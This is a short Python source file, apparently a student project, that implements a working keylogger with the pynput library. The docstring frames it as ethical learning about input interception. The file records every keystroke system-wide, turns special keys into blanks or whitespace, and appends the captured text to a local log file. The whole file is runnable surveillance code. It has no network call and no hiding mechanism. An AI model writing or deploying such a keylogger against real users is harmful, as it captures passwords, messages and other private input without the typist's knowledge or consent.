"""
Zerlyne Nandwani-Simons
Python Keylogger
Nov. 17, 2024
The purpose of this project is to learn about user input interception and explore security vulnerabilities in a
    controlled, ethical manner.
"""

from pynput.keyboard import Listener


# store the keystrokes in text file
# file-handling (read, write, append)
# only need append so repetition doesn't occur
# Listeners - listen to keystrokes

def writeToFile(key):
    letter = str(key)
    # replace the single quotes with nothing to create the full word
    letter = letter.replace("'", "")

    # deals with certain keys
    if letter == 'Key.alt':
        letter = ''
    if letter == 'Key.alt_gr':
        letter = ''
    if letter == 'Key.alt_l':
        letter = ''
    if letter == 'Key.alt_r':
        letter = ''
    if letter == 'Key.backspace':
        letter = ''
    if letter == 'Key.caps_lock':
        letter = ''
    if letter == 'Key.cmd':
        letter = ''
    if letter == 'Key.cmd_1':
        letter = ''
    if letter == 'Key.cmd_r':
        letter = ''
    if letter == 'Key.ctrl':
        letter = ''
    if letter == 'Key.ctrl_l':
        letter = ''
    if letter == 'Key.ctrl_r':
        letter = ''
    if letter == 'Key.delete':
        letter = ''
    if letter == 'Key.down':
        letter = ''
    if letter == 'Key.end':
        letter = ''
    if letter == 'Key.enter':
        letter = '\n'
    if letter == 'Key.esc':
        letter = ''
    if letter == 'Key.f1':
        letter = ''
    if letter == 'Key.home':
        letter = ''
    if letter == 'Key.insert':
        letter = ''
    if letter == 'Key.left':
        letter = ''
    if letter == 'Key.menu':
        letter = ''
    if letter == 'Key.num_lock':
        letter = ''
    if letter == 'Key.page_down':
        letter = ''
    if letter == 'Key.page_up':
        letter = ''
    if letter == 'Key.pause':
        letter = ''
    if letter == 'Key.print_screen':
        letter = ''
    if letter == 'Key.right':
        letter = ''
    if letter == 'Key.scroll_lock':
        letter = ''
    if letter == 'Key.shift':
        letter = ''
    if letter == 'Key.shift_l':
        letter = ''
    if letter == 'Key.shift_r':
        letter = ''
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.tab':
        letter = '\t'
    if letter == 'Key.up':
        letter = ''

    #print(letter)

    with open("log.txt", 'a') as f:
        f.write(letter)

# create Listener object
    # will call on_press area which will call writeToFile
with Listener(on_press = writeToFile) as l:
     # adds single quotes to each letter and ensures they're joined together
     l.join()